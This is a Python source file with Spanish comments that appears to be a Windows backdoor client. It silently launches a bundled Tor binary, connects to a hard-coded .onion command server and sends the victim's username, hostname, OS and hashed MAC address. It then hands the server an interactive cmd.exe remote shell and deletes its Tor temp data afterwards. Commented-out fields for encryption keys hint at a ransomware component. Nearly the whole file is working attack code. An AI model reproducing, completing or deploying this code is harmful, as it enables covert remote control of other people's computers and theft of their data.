import hashlib
import json
from pathlib import Path
import shutil
import socket
import tempfile
import time
import subprocess
import platform
import getpass
import ssl
import certifi
import sys
import os
import socks

from getmac import get_mac_address

# -------- CONFIG ----------
ONION_HOST = "umavi2q4i2ozfrllxd4ekfr2kmgw4s4kid6daqib623wugg5qe2u56id.onion"
ONION_PORT = 443
LHOST = "127.0.0.1"
LPORT = 9050
TOR_FOLDER = Path(__file__).parent / "tor"
TOR_EXE = TOR_FOLDER / "tor.exe"
# --------------------------
BUFFER_SIZE = 4096
RETRY_DELAY = 5
bool_ejec= False
# --------------------------

def make_torrc(data_dir, socks_port):
    torrc = f"""
SocksPort {socks_port}
DataDirectory {data_dir}
Log notice stdout
"""
    return torrc

def start_portable_tor():
    ntp=subprocess.run(["w32tm", "/resync"], capture_output=True, text=True, shell=False, creationflags=subprocess.CREATE_NO_WINDOW)
    if not TOR_EXE.exists():
        raise FileNotFoundError(f"tor.exe no encontrado en {TOR_EXE}")
    data_dir = Path(tempfile.mkdtemp(prefix="tor_data_")).absolute()
    torrc_path = data_dir / "torrc"
    torrc_path.write_text(make_torrc(str(data_dir), LPORT), encoding="utf-8")
    log_file = open(str(data_dir / "tor.log"), "w", encoding="utf-8")

    proc = subprocess.Popen([str(TOR_EXE), "-f", str(torrc_path)],
                            stdout=log_file,
                            stderr=log_file,
                            stdin=subprocess.DEVNULL,
                            creationflags=subprocess.CREATE_NO_WINDOW)
    return proc, data_dir

def stop_portable_tor(proc, data_dir):
    try: proc.terminate()
    except Exception: pass
    try: proc.kill()
    except Exception: pass
    try: shutil.rmtree(str(data_dir), ignore_errors=True)
    except Exception: pass
    #eliminar los temp
    temp = Path(tempfile.gettempdir())

    # Limpia tor_data_XXXX
    for d in temp.glob("tor_data_*"):
        try:
            shutil.rmtree(d, ignore_errors=True)
        except Exception as e:
            print(f"[!] No se pudo eliminar {d}: {e}")


def connect():
    while True:
        try:
            print(f"[~] Intentando conectar a {ONION_HOST} (TOR)...")

            raw_socket = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
            raw_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            raw_socket.set_proxy(socks.SOCKS5, LHOST, LPORT,rdns=True)
            raw_socket.connect((ONION_HOST, ONION_PORT))
            #envía el JSON inicial
            try:
                    client_id = hashlib.sha256(get_mac_address().encode()).hexdigest()
                    username = getpass.getuser()
                    hostname = socket.gethostname()
                    os_info = f"{platform.system()} {platform.release()}"

                    # Siempre recopila la información básica del sistema
                    data = {
                        "type": "initial_info",
                        "client_id": client_id,
                        "username": username,
                        "hostname": hostname,
                        "os_info": os_info
                    }

                    if not bool_ejec:
                        # restorna las claves del cifrado
                        #encrypted_key = 
                        #ephemeral_public_key = 

                        #data["encrypted_key"] = encrypted_key
                        #data["ephemeral_public_key"] = ephemeral_public_key
                        
                        bool_ejec = True
                    
                    try:
                        raw_socket.sendall(json.dumps(data).encode("utf-8") + b"\n") # Usar sendall para asegurar que se envía todo
                        print("[*] Información inicial del equipo y clave cifrado enviada al servidor.")
                        return raw_socket
                    except Exception as e:
                        print(f"[!] Error al enviar los datos JSON al servidor: {e}")                    
            except Exception as e:
                print(f"[!] Error general en la función r: {e}")
                # Aquí podrías considerar enviar un mensaje de error básico al servidor si la conexión sigue activa
                return None
        
        except Exception as e:
            print(f"[!] Error de conexión: {e}")
            print(f"[~] Reintentando en {RETRY_DELAY} segundos...\n")
            time.sleep(RETRY_DELAY)

def shell(client):
    print("[*] Iniciando shell remota (cmd.exe)...")
    proc = subprocess.Popen(
        ["cmd.exe"],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,  # Redirige stderr a stdout
        shell=True,
        # NO usar text=True aquí. Manejaremos la codificación manualmente.
        # NO especificar encoding aquí, ya que codificaremos/decodificaremos manualmente.
    )
    empty_count = 0
    while True:
        try:
            # Eliminar el envío de prompt constante aquí. El servidor no lo espera si ya funcionaba sin él.
            # Solo enviar un prompt si el comando recibido es vacío.

            cmd = client.recv(BUFFER_SIZE).decode("utf-8").strip()
            
            if not cmd:
                # La versión antigua enviaba '>' solo en comandos vacíos. Volvemos a eso.
                client.send(b">\n") # Añadir un salto de línea para que el servidor lo pueda leer como línea
                empty_count += 1
                print(f"[~] Comando vacío #{empty_count}")
                if empty_count >= 5:
                    print("[x] Demasiados comandos vacíos. Cerrando conexión.")
                    break
                continue
            else:
                empty_count = 0  # Reset si el comando es válido
                print(f"[>] Comando recibido: {cmd}")
            
            if cmd.lower() == "exit":
                print("[*] Comando 'exit' recibido. Cerrando sesión.")
                client.send("[+] Cerrando sesión.\n".encode("utf-8"))
                break

            # Escribir el comando en CP850 y añadir salto de línea
            proc.stdin.write((cmd + "\n").encode("CP850"))
            proc.stdin.flush()
            time.sleep(0.3) # Dar tiempo a cmd.exe para procesar

            output = b""
            while True:
                try:
                    # Leer en CP850, decodificar a utf-8 para enviar al servidor
                    data = proc.stdout.read1(BUFFER_SIZE) # Leer bytes directamente
                    if not data: # No hay más datos
                        break
                    
                    # Decodificar de CP850 a string, luego codificar a UTF-8 para enviar
                    output += data.decode('CP850', errors='replace').encode('utf-8')
                    
                    # Si leemos menos del BUFFER_SIZE, probablemente es el final de la salida actual
                    if len(data) < BUFFER_SIZE:
                        break
                except Exception as e:
                    print(f"[!] Error leyendo stdout de subprocess: {e}")
                    break # Salir si hay un error en la lectura

            # Si no hay salida de stdout, revisar stderr (aunque ya redirigimos a stdout)
            # La version anterior tenia esta logica, la mantendremos por si acaso
            if not output and proc.stderr: # Añadido 'and proc.stderr' para evitar error si no hay stderr pipe
                try:
                    error_data = proc.stderr.read1(BUFFER_SIZE)
                    if error_data:
                        output += error_data.decode('CP850', errors='replace').encode('utf-8')
                except Exception as e:
                    print(f"[!] Error leyendo stderr de subprocess: {e}")


            # Asegurarse de que siempre se envía algo, y que termine con un salto de línea para el servidor
            client.send(output if output else b"[sin salida]\n")
            print("[✓] Resultado enviado al servidor.\n")

        except Exception as e:
            print(f"[!] Error en la shell: {e}")
            try:
                client.send(f"[!] Error: {e}\n".encode("utf-8"))
            except:
                print("[!] No se pudo enviar el mensaje de error.")
            break

    proc.kill()
    
    stop_portable_tor(proc, data_dir)
    print("[x] Conexión cerrada.\n")

def main():
    global proc, data_dir

    while True:
        proc, data_dir = start_portable_tor()
        #print(proc)
        #print(data_dir)
        try:
            print("Tor embebido arrancando...")
            client = connect()
            shell(client)
        except Exception as e:
            print(f"[!] Error inesperado: {e}")
            client.close()
            print("[~] Intentando reconectar...\n")
        except KeyboardInterrupt:
            # Esto no debería ejecutarse, porque SIGINT ya está capturado arriba,
            # pero lo dejamos por seguridad
            print("\n[CTRL+C] Interrumpido.")
            stop_portable_tor(proc, data_dir)
            break
        finally:
            if proc:
                stop_portable_tor(proc, data_dir)

if __name__ == "__main__":
    main()
